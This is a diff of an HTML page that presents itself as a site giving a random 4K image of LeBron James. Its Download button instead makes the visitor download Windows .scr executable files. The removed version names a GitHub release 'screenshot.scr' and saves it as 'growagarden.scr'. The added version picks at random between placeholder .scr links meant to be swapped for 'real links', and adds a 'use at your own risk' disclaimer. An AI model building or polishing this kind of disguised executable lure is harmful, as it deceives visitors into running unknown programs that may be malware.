@@ -3,20 +3,39 @@
 <head>
   <meta charset="UTF-8">
   <title>4K LeBron Image</title>
-    <meta name="description" content="This website gives you a random image of LeBron James in 4k">
+  <meta name="description" content="This website gives you a random image of LeBron James in 4K.">
 </head>
 <body>
-  <h1>random 4k picture of Lebron</h1>
+  <h1>Random 4K Picture of LeBron</h1>
   <button id="downloadBtn">Download</button>
+
+  <!-- Disclaimer button -->
+  <button id="disclaimerBtn" style="margin-top: 50px;">Disclaimer</button>
 
   <script>
     document.getElementById('downloadBtn').addEventListener('click', function() {
+      // Array of your two URLs (replace these with your real links)
+      const urls = [
+        'https://example.com/link1.scr',
+        'https://example.com/link2.scr'
+      ];
+
+      // Pick a random URL
+      const randomUrl = urls[Math.floor(Math.random() * urls.length)];
+
+      // Create a temporary <a> to trigger the download
       const link = document.createElement('a');
-      link.href = 'https://github.com/Nestrix-Applications/Lebron/releases/download/1/screenshot.scr';
-      link.download = 'growagarden.scr'; // This may be ignored by the browser on external links
+      link.href = randomUrl;
+      // Optionally specify download name (often ignored for external URLs)
+      link.download = '';
+
       document.body.appendChild(link);
       link.click();
       document.body.removeChild(link);
+    });
+
+    document.getElementById('disclaimerBtn').addEventListener('click', function() {
+      alert('Disclaimer: This content is provided as-is. Use at your own risk.');
     });
   </script>
 </body>
